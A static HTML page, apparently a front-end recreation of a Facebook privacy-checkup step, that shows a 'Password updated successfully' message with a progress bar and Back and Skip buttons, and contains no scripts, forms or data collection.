<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="icon" href="./Image/icon.png" />
    <link rel="stylesheet" href="Css/body.css">
    <link rel="stylesheet" href="Css/Privacy2.css">
</head>

<body>
    <div class="step-container">
        <div class="multi-step-form">
            <div class="active">
                <div class="mobile_header">
                    <button class="back_header" onClick="">
                        <i class="icon-back"></i>
                    </button>
                    <div class="title_header">
                        <span>Password</span>
                    </div>
                    <div class="back_header"></div>
                </div>
                <div class="title2">
                    <div class="icon-wrapper">
                        <button class="event_back_step" onClick="">
                            <i class="icon-back"></i>
                        </button>
                    </div>
                    <span>Is your password private?</span>
                </div>
                <hr />
                <div class="change_pass_success">
                    <h2>Password updated successfully</h2>
                    <span>
                        Remember to use your new password next time you
                        log in. You can change your password at any time
                        in your account settings.
                    </span>
                </div>
    
                <div class="img_change_pass_success">
                    <i class="icon_change_pass_success"></i>
                </div>
                <div class="progressBar">
                    <div
                        style="width: 50%"
                        class="progress"
                    ></div>
                </div>
        
                <div class="event_button_container">
                    <div class="event_button_wrapper">
                        <div class="progressBar_mobile">
                            <div class="dot_mobile "> </div>
                            <div class="dot_mobile active"> </div>
                            <div class="dot_mobile "> </div>
                            <div class="dot_mobile "> </div>
                        </div>
                        <button class="event_back" onClick="">
                            Back
                        </button>
                        <button class="event_continue" onClick="">
                            Skip
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>
